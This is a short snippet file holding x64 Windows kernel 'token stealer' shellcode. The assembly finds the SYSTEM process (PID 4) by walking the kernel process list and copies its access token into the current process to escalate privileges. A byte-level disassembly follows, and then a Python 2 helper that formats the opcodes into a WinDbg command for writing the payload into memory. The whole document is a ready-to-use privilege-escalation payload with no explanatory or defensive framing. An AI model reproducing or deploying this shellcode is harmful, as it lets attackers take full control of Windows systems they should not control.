https://defuse.ca/online-x86-assembler.htm#disassembly

// Token Stealer x64 

mov rax,QWORD PTR gs:[0x188]
mov rax,QWORD PTR [rax+0xb8]
push rax
lea rax, [rax+0x2f0]
tag:
mov rax, [rax]
mov rbx, [rax-0x8]
cmp rbx, 4
jne tag
mov rbx, [rax+0x68]
pop rax
mov [rax+0x358], rbx


Disassembly:

Disassembly:
0:  65 48 8b 04 25 88 01    mov    rax,QWORD PTR gs:0x188
7:  00 00
9:  48 8b 80 b8 00 00 00    mov    rax,QWORD PTR [rax+0xb8]
10: 50                      push   rax
11: 48 8d 80 f0 02 00 00    lea    rax,[rax+0x2f0]
0000000000000018 <tag>:
18: 48 8b 00                mov    rax,QWORD PTR [rax]
1b: 48 8b 58 f8             mov    rbx,QWORD PTR [rax-0x8]
1f: 48 83 fb 04             cmp    rbx,0x4
23: 75 f3                   jne    18 <tag>
25: 48 8b 58 68             mov    rbx,QWORD PTR [rax+0x68]
29: 58                      pop    rax
2a: 48 89 98 58 03 00 00    mov    QWORD PTR [rax+0x358],rbx


a = "65488B042588010000488B80B800000050488D80F0020000488B00488B58F84883FB0475F3488B58685848899858030000"
b = []
for i in xrange(0,len(a), 4):
    b.append("%s %s" % (a[i:i+2],a[i+2:i+4]))

print "eb RIP " +  " ".join(b)